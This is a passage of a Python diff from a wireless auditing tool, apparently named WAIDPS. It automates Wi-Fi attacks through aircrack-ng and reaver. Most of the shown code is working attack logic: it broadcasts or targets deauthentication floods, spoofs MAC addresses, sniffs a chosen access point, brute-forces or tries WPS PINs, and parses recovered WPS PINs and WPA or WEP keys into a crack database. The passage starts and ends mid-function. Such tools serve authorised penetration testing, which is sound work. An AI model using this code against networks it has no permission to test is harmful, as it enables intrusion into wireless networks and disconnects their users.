+                            line=str(line).replace("[!] ","").replace("[+] ","")
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SGreen + str(line) + "...."
+                        if str(line).find("10 failed connections in a row")!=-1:
+                            DMSG=fcolor.SWhite + "[!]   " + Now() + " - " + fcolor.BRed + "10 failed connections in a row....\n"
+                        if str(line).find("Nothing done, nothing to")!=-1:
+                            line=""
+                        if str(line).find("WPS PIN: '")!=-1:
+                            WPS_CRACKED="1"
+                            rlist=str(line).split(" ")
+                            WPS_PIN=str(line)[10:-1]
+                            DMSG=fcolor.SWhite + "[.]   " + Now() + " - " + fcolor.BBlue + "Found WPS PIN [ " + fcolor.BRed + str(WPS_PIN) +  fcolor.BBlue + " ] ....\n"
+                        if str(line).find("WPA PSK: '")!=-1:
+                            WPS_PW=str(line)[10:-1]
+                            if str(__builtin__.ATTACK_AP_PRIVACY).find("WEP")!=-1:
+                                Privacy="WEP Key"
+                            else:
+                                Privacy="WPA Passphase"
+                            DMSG=fcolor.SWhite + "[.]   " + Now() + " - " + fcolor.BBlue + "Found " + str(Privacy) + " [ " + fcolor.BRed + str(WPS_PW) +  fcolor.BBlue + " ] ....\n"
+                        if str(line).find("AP SSID: '")!=-1:
+                            WPS_ESSID=str(line)[10:-1]
+                            DMSG=fcolor.SWhite + "[.]   " + Now() + " - " + fcolor.BBlue + "ESSID [ " + fcolor.BRed + str(WPS_ESSID) +  fcolor.BBlue + " ] ....\n"
+                        if str(line).find("Failed to recover WPA key")!=-1:
+                            line=str(line).replace("[!] ","").replace("[+] ","")
+                            DMSG=tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.BRed + "Failed to recover encryption key.." + "\n"
+                            WPS_CRACKED="2"
+                        if str(DMSG)!="":
+                            printl (DMSG ,"0","")
+            if LINEFOUND=="1":
+                open(__builtin__.WPS_File,"w").write("")
+            if WPS_CRACKED=="1":
+                print ""
+                AddCrackDB(__builtin__.ATTACK_AP_BSSID,__builtin__.ATTACK_AP_PRIVACY,WPS_PW,WPS_ESSID,"",WPS_PIN)
+        if WPS_CRACKED=="":
+            while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                usr_resp = sys.stdin.readline()
+                if usr_resp:
+                    retkey="1"
+            while retkey!="":
+                MSG=""
+                LineBreak()
+                printc ("i",fcolor.BBlue + "Auditing Menu [WPS]","")
+                DisplayAPDetail()
+                MSG=MSG + tabspacefull + fcolor.BRed + "1/0" + fcolor.SWhite + " - St" + fcolor.BYellow + "o" + fcolor.SWhite + "p Auditing\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "2/D" + fcolor.SWhite + " - " + fcolor.BYellow + "D" + fcolor.SWhite + "eauth Broadcast / Client\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "3/C" + fcolor.SWhite + " - List " + fcolor.BYellow + "C" + fcolor.SWhite + "lients\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "4/S" + fcolor.SWhite + " - " + fcolor.BYellow + "S" + fcolor.SWhite + "poof MAC address\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "5/P" + fcolor.SWhite + " - Try Manual WPS " + fcolor.BYellow + "P" + fcolor.SWhite + "IN\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "9/R" + fcolor.SWhite + " - " + fcolor.BYellow + "R" + fcolor.SWhite + "estart Auditing\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "0/T" + fcolor.SWhite + " - Re" + fcolor.BYellow + "t" + fcolor.SWhite + "urn\n"
+                print MSG
+                usr_resp=AskQuestion("Select an option",fcolor.BRed + "0" + fcolor.BYellow + " - Return","U"," ","1")
+                if usr_resp!=" ":
+                    LineBreak()
+                if usr_resp!="0" and usr_resp!="T":
+                    if usr_resp=="1" or usr_resp=="O":
+                        KillAllMonitor()
+                        DisplayComplete(__builtin__.TStart)
+                        KillSubProc(__builtin__.Sniffer)
+                        DelFile (tmpdir + "tmp-capture*.*","")
+                        print "";printc ("x","","")
+                        OptAuditing("")
+                        return;
+                    elif usr_resp=="2" or usr_resp=="D":
+                        MSG=""
+                        printc ("+",fcolor.BBlue + "Deauth Broadcast / Client","")
+                        MSG=MSG + tabspacefull + fcolor.BRed + "1/B" + fcolor.SWhite + " - Deauth Broadcast\n"
+                        MSG=MSG + tabspacefull + fcolor.BRed + "2/C" + fcolor.SWhite + " - Deauth Client " + fcolor.SRed + str(__builtin__.WPA_DEAUTH_MAC)
+                        print MSG
+                        usr_resp=str(AskQuestion( "Enter your option","1/2" + fcolor.SWhite + " - Default 1","U","1","")).lstrip().rstrip()
+                        print ""
+                        DEAUTH=""
+                        if usr_resp=="1" or usr_resp=="B":
+                            DAUTHCT=str(AskQuestion("Enter the number of time to send deauth signal",fcolor.SGreen + "Default - " + str(DAUTHCT),"U",DAUTHCT,"")).lstrip().rstrip()
+                            if DAUTHCT.isdigit()!=True or DAUTHCT=="0":
+                                DAUTHCT=5
+                            print ""
+                            printc (".",fcolor.BRed + "Broadcasting Deauthentication Signal To All Clients..." + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+                            cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID), str(__builtin__.SELECTED_MON)]
+                            ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+                            ps.wait()
+                        if usr_resp=="2" or usr_resp=="C":
+                            if len(__builtin__.CUR_CLIENT)>0:
+                                ListClientFound()
+                            DefaultVal="X"
+                            Default="Default - Return"
+                            if str(__builtin__.WPA_DEAUTH_MAC)!="":
+                                printc ("i",fcolor.BGreen + "Current Deauth Client MAC : " + fcolor.BRed + str(__builtin__.WPA_DEAUTH_MAC),"")
+                                printc (" ",fcolor.SWhite + "To remove the current MAC, enter [" + fcolor.BRed + "X" + fcolor.SWhite +"]","")
+                                Default="Default - " + str(__builtin__.WPA_DEAUTH_MAC) 
+                                DefaultVal=__builtin__.WPA_DEAUTH_MAC
+                            MAC=str(AskQuestion("Enter the Client MAC to Deauth xx:xx:xx:xx:xx:xx :",fcolor.SGreen + str(Default),"U",DefaultVal,"1")).lstrip().rstrip()
+                            if MAC!="" and MAC!="X":
+                                if len(MAC)!=17 or IsHex(MAC)==False:
+                                    printc ("!!!","Invalid MAC Address Entered !","")
+                                    print ""
+                                elif MAC!="X": 
+                                    __builtin__.WPA_DEAUTH_MAC=MAC
+                                    print ""
+                                    DAUTHCT=str(AskQuestion("Enter the number of time to send deauth signal",fcolor.SGreen + "Default - " + str(DAUTHCT),"U",DAUTHCT,"")).lstrip().rstrip()
+                                    if DAUTHCT.isdigit()!=True or DAUTHCT=="0":
+                                        DAUTHCT=5
+                                    CLIENTMAC=__builtin__.WPA_DEAUTH_MAC
+                                    print ""
+                                    printc (".",fcolor.SWhite + Now() + " - " + fcolor.BRed + "Sending Deauthentication Signal To Selected Client : " + fcolor.BYellow + CLIENTMAC + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+                                    cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID),"-c", str(CLIENTMAC), str(__builtin__.SELECTED_MON)]
+                                    ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+                                    lines=ps.communicate()
+                                    lines=str(lines).replace("\\r\\n","\t")
+                                    lines=str(lines).split("\t")
+                                    lines=RearrangeReturn(lines)
+                                    NORESULT="1";TCL_ACK=0;TAP_ACK=0
+                                    for line in lines:
+                                        line=str(line).replace("\n","").replace("\r","")
+                                        if line!="":
+                                            lina=str(line).replace("\x00","").replace("[","").replace("]","").replace("|"," ").replace("  "," ").replace(" ",",")    
+                                            lina=lina+",,,,,,,,,"
+                                            LSPLIT=str(lina).split(",")
+                                            if len(LSPLIT)>9:
+                                                if LSPLIT[5]=="STMAC:" and len(LSPLIT[6])==17 and LSPLIT[9]=="ACKs":
+                                                    T_PKTS=int(LSPLIT[2])*2
+                                                    CL_ACK=LSPLIT[7]
+                                                    TCL_ACK=TCL_ACK + int(CL_ACK)
+                                                    if int(CL_ACK)==0:
+                                                        CL_ACK=fcolor.BRed + str(CL_ACK)
+                                                    AP_ACK=LSPLIT[8]
+                                                    TAP_ACK=TAP_ACK+int(AP_ACK)
+                                                    if int(AP_ACK)==0:
+                                                        AP_ACK=fcolor.BRed + str(AP_ACK)
+                                                    printc (" ",fcolor.SGreen + "Packet Sent : " + fcolor.BGreen + str(T_PKTS) + fcolor.SGreen + "\t\tAccess Point [ " + fcolor.SWhite + __builtin__.ATTACK_AP_BSSID + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(AP_ACK) + fcolor.SGreen + "\tClient [ " + fcolor.SWhite + CLIENTMAC + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(CL_ACK),"")
+                                                    NORESULT=""
+                                    if NORESULT=="1":
+                                        printc ("!",fcolor.SRed + "No Result !!","")
+                                    else:
+                                        MSG=""
+                                        if int(TCL_ACK)==0:
+                                            MSG=MSG + "No acknowledgement received from Client"    
+                                        if int(TAP_ACK)==0:    
+                                            if MSG=="":
+                                                MSG="No acknowledgement received from Access Point"
+                                            else:
+                                                MSG="No acknowledgement received from Access Point and Client"
+                                        if MSG!="":
+                                            printc (" ",fcolor.SRed + MSG,"")
+                            else:
+                                printc (".",fcolor.SRed + "MAC address removed..","")
+                                __builtin__.WPA_DEAUTH_MAC=""
+                    elif usr_resp=="3" or usr_resp=="C":
+                        if len(__builtin__.CUR_CLIENT)>0:
+                            ListClientFound()
+                        else:
+                            printc ("!",fcolor.SRed + "No client found !!","")
+                    elif usr_resp=="5" or usr_resp=="P":
+                        PIN=str(AskQuestion("Enter the WPS PIN to try ",fcolor.SGreen + "8 Digits","N"," ","1")).lstrip().rstrip()
+                        if PIN!=" ":
+                            if len(PIN)==8:
+                                if IsFileDirExist(tmpdir + "WPS_Result.txt")=="F":
+                                    DelFile(tmpdir + "WPS_Result.txt","")
+                                if IsFileDirExist(__builtin__.WPS_File2)=="F":
+                                    DelFile(__builtin__.WPS_File2,"")
+                                printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Trying out WPS PIN [ " + fcolor.BYellow + str(PIN) + fcolor.BPink + " ]...","")
+                                cmdLine="xterm -geometry 100x10-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing WPS PIN [" + str(PIN) + "]" + "' -e 'reaver -i " + str(__builtin__.SELECTED_ATK) + " -b " + str(__builtin__.ATTACK_AP_BSSID) + str(CH5GHZ) + " -a -vv -g 1 -p " + str(PIN) + " -o " + str(__builtin__.WPS_File2) + " | tee " + tmpdir + "WPS_Result.txt'" 
+                                ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+                                __builtin__.ProcID=ps.pid
+                                retkey=""
+                            else:
+                                printc ("!!!","The PIN entered must be exactly 8 digits !!","")
+                    elif usr_resp=="4" or usr_resp=="S":
+                        ListClientFound()
+                        Result=ChangeMACAddr(__builtin__.SELECTED_ATK,__builtin__.SELECTED_IFACE)
+                        DelFile (tmpdir + "tmp-capture*.*","")
+                        KillAllMonitor()
+                        printc (".",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Starting WPS Attack for Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.BGreen + " ]..","")
+                        cmdLine="xterm -geometry 100x20-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Sniffing Packet' -e 'airodump-ng --bssid " + TargetMAC  + " -c" + str(TargetChannel) + " -w " + tmpdir + "tmp-capture" + " " + str(__builtin__.SELECTED_ATK) + " | tee " + tmpdir + "SNIF_RESULT.txt" + "'"
+                        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+                        __builtin__.Sniffer=ps.pid
+                        cmdLine="xterm -geometry 100x10-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Auditing WPS [" + str(TargetMAC) + "' -e 'reaver -i " + str(__builtin__.SELECTED_ATK) + " -b " + str(__builtin__.ATTACK_AP_BSSID) + str(CH5GHZ) + " -c " + str(__builtin__.ATTACK_AP_CH) + " -a -vv --dh-small --win7 -o " + str(__builtin__.WPS_File) + " | tee " + tmpdir + "WPS_Result.txt'" 
+                        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+                        __builtin__.ProcID=ps.pid
+                        __builtin__.ProcID=WEPAttackMode("AAPC","","1")
+                        DelFile (tmpdir + "tmp-capture*.cap","")
+                    elif usr_resp=="9" or usr_resp=="R":
+                        printc ("i",fcolor.BGreen + "Restarting Monitoring process .....","")
+                        KillAllMonitor()
+                        LineBreak()
+                        AttackWPSProc(TargetMAC,TargetChannel,ClentList,Auto)
+                        return
+                else:
+                    retkey=""
+            NEWCLIENT=GetClientFromCSV (tmpdir + "tmp-capture-01.csv")
+            if len(NEWCLIENT)>0:
+                __builtin__.CUR_CLIENT=__builtin__.NEW_CLIENT
+                ClentList=__builtin__.NEW_CLIENT
+                __builtin__.CUR_CLIENT_FS=__builtin__.NEW_CLIENT_FS
+                __builtin__.CUR_CLIENT_LS=__builtin__.NEW_CLIENT_LS
+                __builtin__.CUR_CLIENT_PWR=__builtin__.NEW_CLIENT_PWR
+                __builtin__.CUR_CLIENT_DATA=__builtin__.NEW_CLIENT_DATA
+                __builtin__.CUR_CLIENT_PROBE=__builtin__.NEW_CLIENT_PROBE
+         
+    print ""
+    DisplayComplete(__builtin__.TStart)
+    KillSubProc(__builtin__.Sniffer)
+    DelFile(tmpdir + "tmp-capture*.*","")
+    LineBreak()
+    printc ("x","","")
+    OptAuditing("")
+    return
+
+def TimerApp(cmdLine,DelaySeconds,ShowDisplay):
+    import os
+    returncode=-1
+    if ShowDisplay=="":
+        ShowDisplay="0"
+    if DelaySeconds=="":
+        DelaySeconds=5
+    if cmdLine!="":
+        if ShowDisplay=="1":
+            printc (" ",fcolor.SGreen + "Running command line [ " + fcolor.SRed + cmdLine + fcolor.SGreen + " ] ....","")
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)	
+        pid=ps.pid
+        if str(ps.communicate()[0])!="":
+            __builtin__.TIMER_RET = ps.communicate()[0].split("\n")
+        print "PS : " + str(ps.communicate()[0])
+        if ShowDisplay=="1":
+            printc (" ",fcolor.SGreen + "PID : " + fcolor.SRed + str(pid) + fcolor.SGreen + "","")
+            printc (" ",fcolor.SGreen + "Delay for [ " + fcolor.SRed + str(DelaySeconds) + fcolor.SGreen + " ] seconds ....","")
+        time.sleep(DelaySeconds)
+        if ShowDisplay=="1":
+            printc (" ",fcolor.SGreen + "Killing PID [ " + fcolor.SRed + str(pid) + fcolor.SGreen + " ] ....","")
+        os.killpg(pid, signal.SIGTERM)
+        returncode = ps.wait()
+        if ShowDisplay=="1":
+            printc (" ",fcolor.SGreen + "Returncode of subprocess [ " + fcolor.SRed + str(returncode) + fcolor.SGreen + " ] ....","")
+    return returncode;
+
+def RearrangeReturn(sLine):
+    x=0
+    tmplist=[]
+    while x<len(sLine):
+        tline=sLine[x]
+        tl=int(len(tline))
+        if tl>0:
+            nx=tline.rfind("\\r",0,tl)
+            if nx>0:
+                nx=nx+2
+                nline=tline[nx:]
+                tmplist.append (str(nline))
+        x += 1
+    return tmplist
+
+def GetClientFromCSV(sFile):
+    tmpfile=tmpdir + "tmp.csv"
+    FOUNDCLIENTS=[]
+    FoundClient=""
+    __builtin__.NEW_CLIENT=[]
+    __builtin__.NEW_CLIENT_FS=[]
+    __builtin__.NEW_CLIENT_LS=[]
+    __builtin__.NEW_CLIENT_PWR=[]
+    __builtin__.NEW_CLIENT_DATA=[]
+    __builtin__.NEW_CLIENT_PROBE=[]
+    open(tmpfile,"wb").write("" )
+    if IsFileDirExist(sFile)=="F":
+        with open(sFile,"r") as f:
+            for line in f:
+                line=line.replace("\n","").replace("\00","")
+                if line!="":
+                    open(tmpfile,"a+b").write(str(line) + "\n")
+                if line.find("Station MAC, First time seen, Last time seen")!=-1:
+                   FoundClient="1"
+                if FoundClient=="" and line.find("BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key")==-1 and line.find("Station MAC, First time seen, Last time seen")==-1:
+                    SPLITDATA=str(line).split(",")
+                    if len(SPLITDATA[0])==17:
+                        __builtin__.ATTACK_AP_BSSID=str(SPLITDATA[0]).lstrip().rstrip()
+                        __builtin__.ATTACK_AP_FS=str(SPLITDATA[1]).lstrip().rstrip()
+                        __builtin__.ATTACK_AP_LS=str(SPLITDATA[2]).lstrip().rstrip()
+                        __builtin__.ATTACK_AP_CH==str(SPLITDATA[3]).lstrip().rstrip()
+                        __builtin__.ATTACK_AP_PRIVACY=str(SPLITDATA[5].lstrip().rstrip())
+                        __builtin__.ATTACK_AP_CIPHER=str(SPLITDATA[6]).lstrip().rstrip()
+                        __builtin__.ATTACK_AP_AUTH=str(SPLITDATA[7]).lstrip().rstrip()
+                        SPLITDATA[8]=str(SPLITDATA[8]).lstrip().rstrip()
+                        if str(SPLITDATA[8])!="0" and str(SPLITDATA[8])!="-1":
+                            __builtin__.ATTACK_AP_PWR=str(SPLITDATA[8])
+                        __builtin__.ATTACK_AP_BEACON=str(SPLITDATA[9]).lstrip().rstrip()
+                        __builtin__.ATTACK_AP_DATA=str(SPLITDATA[10]).lstrip().rstrip()
+                        __builtin__.ATTACK_AP_ESSID=str(SPLITDATA[13]).lstrip().rstrip()
+                if FoundClient=="1" and line.find("Station MAC, First time seen, Last time seen")==-1:
+                    if len(line)>20:
+                        ClientDetail=str(line).split(",")
+                        if len(ClientDetail[0])==17:
+                            if str(FOUNDCLIENTS).find(ClientDetail[0])==-1:
+                                FOUNDCLIENTS.append (ClientDetail[0])
+                                __builtin__.NEW_CLIENT.append (str(ClientDetail[0]))
+                                __builtin__.NEW_CLIENT_FS.append (str(ClientDetail[1]))
+                                __builtin__.NEW_CLIENT_LS.append (str(ClientDetail[2]))
+                                __builtin__.NEW_CLIENT_PWR.append (str(ClientDetail[3]))
+                                __builtin__.NEW_CLIENT_DATA.append (str(ClientDetail[4]))
+                                PROBE_DETAIL=""
+                                if len(ClientDetail)>5:
+                                    PROBE_DETAIL=str(ClientDetail[6])
+                                    PROBE_DETAIL=str(PROBE_DETAIL).lstrip().rstrip()
+                                __builtin__.NEW_CLIENT_PROBE.append (str(PROBE_DETAIL))
+                                
+    return FOUNDCLIENTS;
+
+def ExtractDump():
+    if __builtin__.DumpProc!="":
+        KillSubProc(str(__builtin__.DumpProc))
+    RunAirodump()
+    cmdLine="ps -eo pid | grep '" + str(__builtin__.DumpProc) + "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE)	
+    readout=str(ps.stdout.read().replace("\n",""))
+    readout=str(readout).lstrip().rstrip()
+    ps.wait();ps.stdout.close()
+    __builtin__.DumpProc=str(__builtin__.DumpProc)
+    if str(readout)!=str(__builtin__.DumpProc):
+        printc ("!", "[Network Monitor stopped - Restarting]","")
+        RunAirodump()
+        time.sleep(1)
+    cmdLine="ps -eo pid | grep '" + str(__builtin__.WashProc) + "'"
+    __builtin__.WashProc=str(__builtin__.WashProc)
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE)	
+    readout=str(ps.stdout.read().replace("\n",""))
+    readout=str(readout).lstrip().rstrip()
+    ps.wait();ps.stdout.close()
+    if str(readout)=="" or readout!=str(__builtin__.WashProc):
+        if __builtin__.LOAD_WPS=="Yes" and __builtin__.FIXCHANNEL==0:
+            printc ("!", "[WPS Monitor stopped - Restarting]","")
+            RunWash()
+            time.sleep(1)
+    LineList = []
+    Encryption = []
+    __builtin__.ListInfo_Exist = 0
+    __builtin__.ListInfo_Add = 0
+    if IsFileDirExist(__builtin__.NewCaptured_Kismet)=="F":
+        with open(__builtin__.NewCaptured_Kismet,"r") as f:
+            for line in f:
+                line=line.replace("\n","")
+                line=line.replace("\00","")
+                if line.find("Network;NetType;ESSID;BSSID;Info;Channel")==-1 and len(line)>10:
+                    line=line + "0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;"
+                    LineList=line.split(";")
+                    BSSID=LineList[3]
+                    if len(BSSID)==17:
+                        ESSID=LineList[2]
+                        if len(ESSID)==0:
+                            ESSID=""
+                        if len(ESSID)>=32:
+                            ESSID=ESSID[:-32]
+                        x=0
+                        foundloc=0
+                        Skip=""
+                        mi=FindMACIndex(BSSID,ListInfo_BSSID)
+                        if mi!=-1:
+                            foundloc=mi
+                            Skip="1"
+                            if IsAscii(ESSID)==True and ESSID.find("\\x")==-1:
+                                if ListInfo_BSSID[foundloc]==BSSID:
+                                    if ListInfo_ESSID[foundloc]!="" and IsAscii(ESSID)==True and ESSID.find("\\x")==-1:
+                                        ESSID=ListInfo_ESSID[foundloc]
+                        QualityPercent=0
+                        QRange=fcolor.SBlack + "Unknown"
+                        if len(LineList[21])>1 and len(LineList[21])<4:
+                            if str(LineList[21])=="No" or str(LineList[21])=="Yes":
+                                LineList[21]=-1
+                            QualityPercent=int(100 + int(LineList[21]))
+                            if QualityPercent>=99 or QualityPercent==0:  
+                                QRange=fcolor.SBlack + "Unknown"
+                            if QualityPercent>=70 and QualityPercent<=98:
+                                QRange=fcolor.SGreen + "V.Good"
+                            if QualityPercent>=50 and QualityPercent<=69:
+                                QRange=fcolor.SGreen + "Good"
+                            if QualityPercent>=26 and QualityPercent<=49:
+                                QRange=fcolor.SYellow + "Average"
+                            if QualityPercent>=1 and QualityPercent<=25:
+                                QRange=fcolor.SRed + "Poor"
+                        Encryption=LineList[7].split(",")
+                        Encryption.append ("-");Encryption.append ("-");Encryption.append ("-")
+                        Privacy="";Ciper="";Auth=""
+                        Privacy=Encryption[0];Ciper=Encryption[1];Auth=Encryption[2];
+                        HiddenSSID="No"
+                        if len(LineList[2])==0:
+                            HiddenSSID="Yes"
+                        BSSID_OUI=Check_OUI(BSSID,"")
+                        StartTime=LineList[19].lstrip().rstrip()
+                        StartTime2=str(LineList[19]).lstrip().rstrip()
+                        EndTime=LineList[20].lstrip().rstrip()
+                        StartTime=ConvertDateFormat(StartTime,"%c")
+                        EndTime=ConvertDateFormat(EndTime,"%c")
+                        if Skip=="":
+                            __builtin__.ListInfo_Add += 1
+                            ListInfo_ESSID.append (ESSID)
+                            ListInfo_HiddenSSID.append (HiddenSSID)
+                            ListInfo_BSSIDTimes.append ("1")
+                            ListInfo_BSSID.append (LineList[3])
+                            ListInfo_Channel.append (LineList[5])
+                            ListInfo_APStandard.append ("-")
+                            ListInfo_ESS.append ("-")
+                            ListInfo_Cloaked.append (LineList[6])
+                            ListInfo_Privacy.append (Privacy)
+                            ListInfo_Cipher.append (Ciper)
+                            ListInfo_Auth.append (Auth)
+                            ListInfo_MaxRate.append (LineList[9])
+                            ListInfo_Beacon.append (LineList[11])
+                            ListInfo_Data.append (LineList[13])
+                            ListInfo_Total.append (LineList[16])
+                            ListInfo_FirstSeen.append (StartTime)
+                            ListInfo_LastSeen.append (EndTime)
+                            ListInfo_BestQuality.append (LineList[21])
+                            ListInfo_BestSignal.append (LineList[22])
+                            ListInfo_BestNoise.append (LineList[23])
+                            ListInfo_GPSBestLat.append (LineList[32])
+                            ListInfo_GPSBestLon.append (LineList[33])
+                            ListInfo_GPSBestAlt.append (LineList[34])
+                            ListInfo_QualityRange.append(QRange)
+                            ListInfo_QualityPercent.append (str(QualityPercent))
+                            ListInfo_BSSID_OUI.append(BSSID_OUI)
+                            ListInfo_WPS.append (str("-"))
+                            ListInfo_WPSVer.append (str("-"))
+                            ListInfo_WPSLock.append (str("-"))
+                            ListInfo_ConnectedClient.append ("0")
+                            __builtin__.ListInfo_Freq.append (str(GetFrequency(LineList[5])))
+                            __builtin__.ListInfo_Signal.append (str("-"))
+                            __builtin__.ListInfo_Enriched.append (str(""))
+                            __builtin__.ListInfo_Quality.append (str("-"))
+                            __builtin__.ListInfo_BitRate.append (str("-"))
+                            __builtin__.ListInfo_WPAVer.append (str("-"))
+                            __builtin__.ListInfo_PairwiseCipher.append (str("-"))
+                            __builtin__.ListInfo_GroupCipher.append (str("-"))
+                            __builtin__.ListInfo_AuthSuite.append (str("-"))
+                            __builtin__.ListInfo_LastBeacon.append (str("-"))
+                            __builtin__.ListInfo_Mode.append (str("-"))
+                            __builtin__.ListInfo_EncKey.append (str("-"))
+                            Elapse=CalculateTime (StartTime,EndTime)
+                            __builtin__.ListInfo_SSIDElapse.append (Elapse)
+                            __builtin__.ListInfo_SSIDTimeGap.append (__builtin__.TimeGap)
+                            __builtin__.ListInfo_SSIDTimeGapFull.append (__builtin__.TimeGapFull)
+                        else:
+                            __builtin__.ListInfo_Exist += 1
+                            Times=ListInfo_BSSIDTimes[foundloc]
+                            Times=int(Times)+1
+                            ListInfo_BSSIDTimes[foundloc]=Times
+                            ListInfo_HiddenSSID[foundloc]= HiddenSSID
+                            ListInfo_BSSID[foundloc] = LineList[3]
+                            if LineList[5]>0:
+                                ListInfo_Channel[foundloc] =  LineList[5]
+                            ListInfo_Cloaked[foundloc] = LineList[6]
+                            if __builtin__.ListInfo_Enriched[foundloc]!="Yes":
+                                ListInfo_Privacy[foundloc] = Privacy
+                                ListInfo_Cipher[foundloc] = Ciper
+                                ListInfo_Auth[foundloc] = Auth
+                            if ESSID!="":
+                                if str(ESSID).find("...")==-1 and str(ESSID).find("\\x")==-1:
+                                    ListInfo_ESSID[foundloc] = ESSID
+                                else:
+                                    if str(ListInfo_ESSID[foundloc])== "":
+                                        ListInfo_ESSID[foundloc] = ESSID
+                            ListInfo_MaxRate[foundloc] = LineList[9]
+                            ListInfo_Beacon[foundloc] = LineList[11]
+                            ListInfo_Data[foundloc] = LineList[13]
+                            ListInfo_Total[foundloc] = LineList[16]
+                            ListInfo_FirstSeen[foundloc] = StartTime
+                            ListInfo_LastSeen[foundloc] = EndTime
+                            ListInfo_BestQuality[foundloc] = LineList[21]
+                            ListInfo_BestSignal[foundloc] = LineList[22]
+                            ListInfo_BestNoise[foundloc] = LineList[23]
+                            ListInfo_GPSBestLat[foundloc] = LineList[32]
+                            ListInfo_GPSBestLon[foundloc] = LineList[33]
+                            ListInfo_GPSBestAlt[foundloc] = LineList[34]
+                            ListInfo_QualityRange[foundloc] = QRange
+                            ListInfo_QualityPercent[foundloc] = str(QualityPercent)
+                            ListInfo_BSSID_OUI[foundloc] = str(BSSID_OUI)
+                            ListInfo_ConnectedClient[foundloc]="0"
+                            Elapse=CalculateTime (StartTime,EndTime)
+                            __builtin__.ListInfo_SSIDElapse[foundloc]= str(Elapse)
+                            __builtin__.ListInfo_SSIDTimeGap[foundloc]= __builtin__.TimeGap
+                            __builtin__.ListInfo_SSIDTimeGapFull[foundloc]= __builtin__.TimeGapFull
+
+def RerunCapturedFile(TargetMAC,TargetChannel):
+    __builtin__.ATTACK_AP_PDATA=""
+    __builtin__.ATTACK_AP_PBEACON=""
+    CHECKFS=""
+    TargetMAC2=str(TargetMAC).replace(":","")
+    __builtin__.WEP_File=tmpdir + "WEP_" + str(TargetMAC2) + "_TMP-" + "*.cap"
+    os.chdir(tmpdir)
+    FName=tmpdir + "WEP_" + str(TargetMAC2) + "_TMP"
+    __builtin__.WEPKeyFile=FName + "_KEY.txt"
+    FFILE=[]
+    FFILE=glob.glob(__builtin__.WEP_File)
+    FFILE=sorted(FFILE,reverse=True)
+    __builtin__.ListNum="01"
+    if len(FFILE)>0:
+        LastFile=FFILE[0]
+        lFile=len(LastFile)
+        lFile=lFile-6
+        __builtin__.ListNum=LastFile[lFile:-4]
+        __builtin__.ListNum=int(__builtin__.ListNum)+1
+        __builtin__.ListNum=str(__builtin__.ListNum).zfill(2)
+    printc (".",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Restarting new Sniffer for Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.SGreen + " ]..","")
+    cmdLine="xterm -geometry 100x20-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Sniffing Packet' -e 'airodump-ng --bssid " + TargetMAC  + " -c" + str(TargetChannel) + " -w " + FName + " " + str(__builtin__.SELECTED_ATK) + "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    __builtin__.Sniffer=ps.pid
+    ps=subprocess.Popen("iwconfig " + str(__builtin__.SELECTED_ATK) + " channel " + str(TargetChannel) + " > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+    ps.wait();ps.stdout.close()
+    __builtin__.CapFile=FName + "-" + str(__builtin__.ListNum) + ".cap"
+    t=0
+    if CHECKFS=="":
+        print ""
+        FS=0
+        NW=Now()
+        while FS<240:
+            if IsFileDirExist(FName + "-" + str(__builtin__.ListNum) + ".csv")=="F": 
+                statinfo = os.stat(FName + "-" + str(__builtin__.ListNum) + ".csv")
+                FS=statinfo.st_size
+            else:
+                FS=0
+            PrintText=fcolor.BBlue + str(NW) + " - " +  "Locating Access Point [ " + fcolor.BYellow + __builtin__.ATTACK_AP_BSSID + fcolor.BBlue + " ] on Channel " + fcolor.BYellow + __builtin__.ATTACK_AP_CH + fcolor.BBlue + ", Please wait...."
+            bcolor=fcolor.SWhite
+            pcolor=fcolor.BGreen
+            tcolor=fcolor.SGreen
+            s=bcolor + "[" + pcolor + str(t) + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + "\r"
